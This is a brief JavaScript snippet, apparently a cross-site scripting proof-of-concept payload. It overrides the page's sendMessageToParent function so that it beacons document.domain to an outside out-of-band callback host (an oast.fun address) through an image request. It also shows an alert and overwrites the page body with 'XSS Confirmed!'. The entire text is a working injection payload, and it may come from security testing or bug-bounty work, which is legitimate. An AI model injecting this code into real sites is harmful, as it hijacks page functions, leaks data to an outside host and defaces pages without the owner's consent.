// 🚨 Force override token flow and ping you
window.sendMessageToParent = function() {
  new Image().src = "https://wdnjvosjkyhkfsmxvovxoq4wsvswtm3id.oast.fun/?" + document.domain;
  alert("✅ JS Executed on " + document.domain);
};

// Optional DOM overwrite to kill spinner
document.body.innerHTML = "<h1 style='color:red'>XSS Confirmed!</h1>";
